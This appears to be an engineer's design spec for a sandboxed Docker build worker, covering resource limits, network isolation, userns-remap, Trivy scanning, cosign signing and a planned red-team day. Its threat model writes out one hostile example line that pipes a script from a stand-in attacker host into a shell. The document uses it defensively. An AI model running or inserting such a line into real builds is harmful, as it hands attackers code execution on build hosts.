# Build worker — technical spec

Detailed design for the submission build worker. Target: Weeks 11-13 of Q1. Replaces the manual human bridge between an approved submission and a signed image on ECR.

This doc is the thing I want to read at the start of Week 11 before writing any code. Writing it now means I've pre-committed to specific trade-offs rather than making them under implementation pressure.

---

## What it does

The worker is a long-running process that:

1. Polls the database for `Submission` rows with `status="approved"`
2. For each one: downloads the user-supplied Dockerfile from R2, runs `docker build` in a sandbox, pushes the result to ECR Public, runs Trivy, signs with cosign, uploads the SBOM
3. Updates the Submission row to `status="built"` on success, `status="failed"` on failure
4. On success, creates a `Module` row in the catalog tied to the submitter's user id

Concurrency: **1 build at a time** on day one. No parallelism. The build host is a single Hetzner box; serializing builds is simpler, cheaper, and easier to reason about than a worker pool. We revisit when queue depth justifies it (see "when to add workers" below).

---

## What it does NOT do

Named explicitly so nobody adds these without discussion:

- **Does not auto-containerize raw source.** User supplies a Dockerfile. No buildpack detection, no Nixpacks, no "we'll figure out how to build your Node app." That's a different product.
- **Does not run the built image.** We build, scan, sign, push. We never `docker run` user code. No preview sandbox, no health-check-by-running-it. The Firecracker preview work is separate (Horizon 3).
- **Does not build from private git repos.** Upstream source must be public. If the Dockerfile references a private repo for a `COPY --from=registry/repo` or similar, the build fails and we don't help the user fix it.
- **Does not accept binary blobs.** No pre-built tarballs, no uploaded `.tar` images, no `docker import`. Dockerfile + text supplementary files only. Closes off an entire class of "hide malware in a binary" attack.
- **Does not support multi-arch builds at launch.** linux/amd64 only. arm64 support is Week 19 or later if users ask for it.

---

## The data flow

```
[submitter]                [reviewer]            [build worker]             [registry]
    │                          │                        │                         │
    │ POST /api/v1/submissions │                        │                         │
    │  + Dockerfile             │                        │                         │
    ├─────────────────────────►│                        │                         │
    │                          │                        │                         │
    │     Submission row       │                        │                         │
    │     status=pending        │                        │                         │
    │     Dockerfile → R2       │                        │                         │
    │                          │                        │                         │
    │                          │ approves in            │                         │
    │                          │ /app/admin             │                         │
    │                          │                        │                         │
    │                          │  status=approved        │                         │
    │                          │                        │                         │
    │                          │                        │ polls every 30s          │
    │                          │                        │ finds approved row      │
    │                          │                        │ status=building          │
    │                          │                        │                         │
    │                          │                        │ docker build            │
    │                          │                        │ (sandboxed)              │
    │                          │                        │                         │
    │                          │                        │                         │ push
    │                          │                        │─────────────────────────►│
    │                          │                        │                         │
    │                          │                        │ trivy scan               │
    │                          │                        │ sbom upload to R2        │
    │                          │                        │ cosign sign              │
    │                          │                        │                         │
    │                          │                        │ status=built             │
    │                          │                        │ Module row created       │
    │                          │                        │                         │
    │  email: build succeeded  │                        │                         │
    │◄─────────────────────────┼────────────────────────┤                         │
```

Key invariant: **the worker never runs without an approved submission**. A reviewer sees the Dockerfile, says "yes," worker runs. This is not a replacement for review; it's automation of what comes after review.

---

## The host

**Hardware:** Hetzner AX41-NVMe (AMD Ryzen 5 3600, 64 GB RAM, 2×512 GB NVMe). ~€50/month. One dedicated box, separate from the preview-demo box.

Why not shared with preview demos: build spikes can eat resources that preview demos need to be responsive. Also: security. Build workers run arbitrary code-ish things; preview demos run known-signed images. Different trust levels belong on different hosts.

**OS:** Debian 12, stock. No custom kernel, no weird patches. Unattended-upgrades for security updates.

**Software, minimum:**
- Docker Engine 25.x (not Docker Desktop; just the daemon)
- `buildx` for multi-stage build performance
- `trivy` CLI (pinned version)
- `cosign` CLI (pinned, same version as the canary pipeline uses)
- `aws` CLI for ECR auth
- Node.js or Rust runtime for the worker itself (see "the worker code")

**Firewall:** ufw with default-deny inbound, allow only SSH (from my static IP) and the worker's heartbeat endpoint.

---

## Sandboxing — the core of the spec

This is where the design lives or dies. A malicious Dockerfile can:

- Pull a 50 GB image and fill disk
- Include `RUN curl -fsSL evil.com/payload.sh | sh` that runs on the build host
- Include an `ENTRYPOINT` that gets executed by anyone who later pulls the image
- Include layers that exfiltrate environment variables or files visible to the build
- Run a build that takes forever, blocking every other submission

Each of these needs a specific mitigation. Here are the actual defenses:

### 1. Resource limits via docker flags

```bash
docker build \
  --memory 4g \                    # hard RAM cap
  --memory-swap 4g \               # no swap escape
  --cpu-quota 200000 \             # 2 CPUs equivalent (200000µs/100000µs period)
  --storage-opt size=20G \         # max layer size
  --network none \                 # DEFAULT — see below
  -f /path/to/Dockerfile \
  -t flareo-build-${submission_id} \
  /path/to/build-context
```

**RAM at 4 GB** is enough for 95% of legitimate web-app Dockerfiles and starves resource-hungry malicious builds. **2 CPUs** is similar: fast enough, not unlimited.

**Storage at 20 GB per build** is the ceiling for any single build's layer tree. Larger than needed for 99% of cases, hard wall for the rest.

### 2. Network isolation

`--network=none` by default. This is the crucial piece.

Immediate objection: "but most Dockerfiles need network! `apt-get install`, `pip install`, `npm install` all fetch from the internet."

**Right. That's the point.** We require submitters to use multi-stage builds where the "fetching" stage uses approved base images with pre-cached dependencies. If they write:

```dockerfile
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y curl
```

...it fails at `apt-get update`. They have to write:

```dockerfile
# OK: use a base image that already has what you need
FROM node:20-slim
COPY package.json package-lock.json ./
RUN npm ci --omit=dev
```

Documented in a dedicated `/docs/submitting-dockerfiles` page. The constraint is annoying but it eliminates entire attack classes:

- No outbound "call home" during build
- No download of unverifiable binaries
- No credential theft via DNS leaks
- No dependency on third-party uptime

**Escape hatch:** the reviewer can mark a submission `requiresNetwork=true` when approving. Worker then uses a constrained network namespace with only HTTPS to a whitelist (npm, pypi, deb.debian.org, a few others). Opt-in, logged, reviewed manually. Most submissions won't need it.

### 3. Isolated user + rootless attempt

Build worker runs as a dedicated unprivileged user `flareo-build`. That user is in the `docker` group (not root) but:

- The Docker daemon itself runs as `root` (standard)
- Mitigation for the root-daemon risk: **the daemon has user namespace remapping enabled** (`/etc/docker/daemon.json` with `"userns-remap": "flareo-build"`), so even if a container somehow gets `root`, it maps to unprivileged `flareo-build` on the host
- Long-term improvement: switch to `rootless` Docker or Podman. Higher priority once one working pipeline exists

### 4. Per-build timeout

```bash
timeout 600 docker build ...
```

10 minutes hard cap. Long-enough for real builds; short enough that someone can't queue up an infinite loop. If legitimate users hit this regularly, raise to 15 or 20. Don't raise without evidence.

### 5. Post-build Trivy scan — mandatory, not optional

After a successful build, before push:

```bash
trivy image --severity CRITICAL,HIGH --exit-code 1 flareo-build-${id}
```

Critical or high CVE → submission fails, status=`scan_rejected`. This catches the "RUN curl evil.sh" case after the fact — even if network was somehow allowed (via `requiresNetwork` or an unpatched escape), the payload it installed would flag on Trivy.

Not a perfect guard. A determined attacker can write a payload Trivy doesn't detect. But it raises the bar enough that opportunistic attacks lose.

### 6. What I'm NOT doing on day one

Called out because they'll sound like good ideas:

- **gVisor / Kata Containers runtime.** Adds operational complexity. Docker's defaults + userns-remap + network-none cover the most common attacks. Revisit if a specific incident shows we need stronger isolation.
- **Ephemeral build VMs per submission.** Nice in theory — fresh kernel per build, no state leak. In practice: boot time adds 30-60 seconds per build, and we're not at a scale where that tax is justified. Worth it at 100 builds/day; overkill at 10.
- **Full static analysis of the Dockerfile.** There are tools that lint Dockerfiles (`hadolint`). Useful to run but not a security boundary — a malicious Dockerfile can pass hadolint.

---

## The worker code

Runtime choice: **TypeScript + Node**, not Rust. Reasons:

1. Shares the Prisma client with the main app. No cross-language schema duplication.
2. Operational tooling is simpler — one language in the stack for now.
3. Performance isn't the constraint; the bottleneck is `docker build`, not JS overhead.

Structure:

```
apps/worker/
├── src/
│   ├── index.ts         # main loop
│   ├── build.ts         # docker build wrapper
│   ├── scan.ts          # trivy wrapper
│   ├── sign.ts          # cosign wrapper
│   ├── push.ts          # ECR push
│   ├── db.ts            # Prisma client (symlinked from main app)
│   └── log.ts           # structured logging → stdout
├── package.json
└── systemd/
    └── flareo-worker.service
```

### The main loop

```ts
async function run() {
  while (!shuttingDown) {
    const job = await claimNextApprovedSubmission();
    if (!job) {
      await sleep(30_000);
      continue;
    }
    try {
      await processSubmission(job);
    } catch (err) {
      await markFailed(job.id, err);
    }
  }
}
```

`claimNextApprovedSubmission` uses a `SELECT ... FOR UPDATE SKIP LOCKED` to atomically pick one approved row and mark it `status=building`. Even though we only run one worker on day one, this pattern is cheap to use now and makes adding a second worker trivial later.

### Failure handling

Every step has explicit failure semantics:

| Step | Failure mode | Retry? |
|---|---|---|
| Download Dockerfile from R2 | Network blip | Yes, 3x with 2^n backoff |
| `docker build` | Build error (user's fault) | No — surface the error |
| `docker build` | Sandbox escape (our problem) | No — page me |
| Trivy scan CRITICAL finding | User's fault (bad dependency) | No — status=scan_rejected |
| ECR push | Transient | Yes, 3x |
| Cosign sign | GitHub OIDC token expired | Yes, refresh and retry 1x |
| Prisma update | DB blip | Yes, 3x |

All errors go to structured logs (JSON lines) and Sentry. The submitter gets an email with the user-facing part of the error message; internal details (stack traces, host paths) never leave Sentry.

### Heartbeat

```
GET /api/v1/worker/heartbeat
→ { status: "ok", lastBuildAt: "2026-04-23T12:00:00Z", queueDepth: 3 }
```

Instatus polls this every minute. 3 consecutive failures → incident on status page + email to me. The heartbeat endpoint runs on the main app (it reads a file the worker writes); the worker itself doesn't expose HTTP.

---

## The UX around the worker

The submitter experience is:

1. Submit via `flareo publish` or `/app/publish` with a Dockerfile
2. Email: "Your submission is in the queue. Typical review within 5 business days."
3. Reviewer approves. Worker runs. Takes 2-10 minutes.
4. Email: "Your module `<slug>` is live at `public.ecr.aws/flareo/<slug>`. Here's the digest: `sha256:...`"
5. Email on failure: "Your build failed. Here's the error: `<sanitized stderr>`. Fix and resubmit."

The admin experience is:

1. `/app/admin` shows pending queue, one card per submission
2. Click in: Dockerfile rendered with syntax highlighting, submitter info, a preview of what the build will produce
3. Two buttons: **Approve** (triggers worker) and **Reject with reason** (emails submitter)
4. Optional: **Approve with network** checkbox for the rare `requiresNetwork=true` case
5. After approval, card moves to "building" state with a progress indicator (reads worker heartbeat)

---

## Database changes

Minimum additions to make this work:

**Submission model:**

```prisma
model Submission {
  // existing fields...

  dockerfileUrl      String?    // R2 URL to the uploaded Dockerfile
  dockerfileSha256   String?    // integrity check
  requiresNetwork    Boolean    @default(false)

  // Build lifecycle
  buildStartedAt     DateTime?
  buildCompletedAt   DateTime?
  buildErrorKind     String?    // "user" | "system" | "scan"
  buildErrorMessage  String?    // sanitized, safe for emailing the submitter
  buildLogUrl        String?    // R2 URL to the full log

  // Result
  resultImageRef     String?    // final pushed image ref
  resultDigest       String?    // the sha256 we signed
  resultSbomUrl      String?    // link to the SBOM in R2
  resultRekorIndex   String?    // cosign transparency log index
}
```

All nullable so existing rows don't break. New columns, non-destructive migration.

**No new model needed** for the worker itself — it's stateless across restarts. Progress lives in the Submission row.

---

## Red-team day — Week 13

Blocked on the calendar: one full day, nothing else. I play the adversarial submitter. I try to:

1. Escape the container and run code on the build host
2. Exhaust disk by pulling huge base images
3. Exfiltrate secrets via DNS (if network is accidentally enabled)
4. Poison the built image in a way Trivy misses
5. Crash the worker with a malformed Dockerfile
6. Queue up submissions that make the worker loop forever

For each one: either I find a working attack (fix before public launch) or I document the mitigation that blocks it.

I write up a `RED_TEAM.md` at the end. If any attack succeeds that the mitigations should have blocked, **public rollout doesn't happen**. Trusted-submitter-only until fixed.

This is not optional and it is not a "maybe if we have time" item. The day is blocked on the Week 13 calendar.

---

## When to add more workers

Not now. Observations for later:

**Add a second worker when:**
- Queue depth regularly exceeds 5 for >1 hour
- Median queue wait time exceeds 15 minutes
- You have Week 14 reliability work done so both workers fail-safely

**Don't add a second worker to:**
- "Feel faster" without queue-depth data
- Handle one particularly slow build (pointless; it still takes the same time)
- Give "priority" to paid users. Build priority via database priority column first; don't conflate priority and concurrency.

**What changes with two workers:**
- `SELECT FOR UPDATE SKIP LOCKED` already handles the dispatch, no code change
- The single heartbeat endpoint now reports both; Instatus check updates
- Docker daemon's userns-remap must not have collisions; confirm by test
- Ensure both workers can't pick up the same submission (the lock handles it, but test anyway)

---

## Cost model

At the expected Week 20 scale (5-20 submissions/week):

| Line item | Monthly cost |
|---|---|
| Hetzner AX41-NVMe | €50 |
| ECR Public egress | €0 (free tier up to 5 TB/month) |
| R2 storage (Dockerfiles + SBOMs + logs) | €2 (~100 GB) |
| Trivy DB updates | €0 (pulls from public S3) |
| Cosign / Sigstore | €0 (free, public good) |
| **Total new infra for the worker** | **~€52/month** |

Against revenue: 1 paying customer (€12/month) covers ~1/4 of this. 5 paying customers cover the worker and start funding the rest. That's why the paid tier starts in Weeks 15-16, not Week 20.

---

## What the spec is explicitly leaving vague

Honest about the unknowns I'll resolve during implementation:

- **Exact Docker daemon config for userns-remap.** I have a working pattern from other projects but haven't written it for this specific host yet. Week 11, day 2.
- **Trivy version pinning strategy.** Pin to a minor version; update quarterly. Pinning too tight means we miss new CVE types; pinning too loose means a Trivy update could flag old builds and we'd need a story for that.
- **The error-email template.** I'll write this once I've seen 5-10 real failures and know what submitters actually need to know.
- **Rate limiting submissions per user.** Right now the `/api/v1/submissions` endpoint uses the `auth-signin` bucket (10/10min). That's fine for submissions but might need its own bucket if submission spam becomes a thing. Revisit at Week 14.

---

## The minimum-viable first ship

If I had only 3 days instead of 14, the smallest thing that would still prove the concept:

- Hardcoded submission id in a CLI script, not a queue loop
- Build on my laptop, not a dedicated host
- Skip Trivy and SBOM (sign unscanned image) for the POC
- Push to a private ECR, not public
- No user emails, I notify manually

That would prove the dockerfile → image → signature chain works end-to-end, which is the highest-uncertainty piece. Build the real queue + reliability layer afterwards.

I won't actually cut corners this aggressively (we have 14 days, not 3), but it's useful to know what the "emergency rollback to a demo" looks like if Week 12 is going badly.

---

## Open questions worth discussing

Before Week 11 starts, I want to have answers to these:

1. **Should we cache base images on the build host?** Pre-pull common layers (`node:20`, `python:3.12`, `alpine:3.19`) so network-none builds against them work without `--network=none` violations. Probably yes, but need to think about supply chain — we'd need to rebuild those pulls weekly and verify them.

2. **What happens if a reviewer approves, the build succeeds, but the same slug is concurrently approved from a different submission?** First-writer-wins? Reject the second? The Submission endpoint already checks for slug collisions against existing Modules but not against other pending submissions. Fix in Week 11.

3. **Do we re-verify the submitter still has a valid account at build time?** Between submission and build there could be days. If they've soft-deleted in that window, do we build? Proposal: yes, build anyway — modules become catalog artifacts, they don't depend on the publisher's account being alive.

4. **How do we handle submissions where the upstream repo has been deleted between submission and build?** Some Dockerfiles `COPY --from=git-repo` or similar. Proposal: this is a user error, surface the Docker error as-is, don't try to be clever.

---

## Success criteria for the quarter's most important piece

At end of Week 13, this feature is "done" (in the sense that we move to Week 14 reliability work) when:

- 5 real submissions have passed through end-to-end, no human intervention between approve-click and signed-image
- 1 dedicated red-team day yielded zero working sandbox escapes
- Build time p95 under 15 minutes for a reasonable Dockerfile
- Failed-build emails have been sent and at least one test user confirmed they were useful
- The `/app/admin` approve/reject flow has been used by me ≥20 times without any crashes or data-integrity issues

If all five check: we move on. If any don't: Week 14 becomes "finish the build worker" instead of "reliability."
